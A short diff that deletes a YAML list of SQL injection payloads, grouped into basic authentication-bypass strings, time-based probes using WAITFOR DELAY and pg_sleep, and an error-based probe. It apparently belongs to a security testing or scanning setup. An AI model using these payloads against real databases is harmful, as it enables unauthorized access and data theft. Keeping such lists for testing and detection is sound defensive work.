@@ -1,9 +1,0 @@
-basic:
-  - "' OR '1'='1"
-  - "' OR '1'='1' -- "
-  - "' OR '1'='1' /*"
-time_based:
-  - "'; WAITFOR DELAY '0:0:5'--"
-  - "'; SELECT pg_sleep(5)--"
-error_based:
-  - "' AND (SELECT 1 FROM users WHERE '1'='1')='1'"
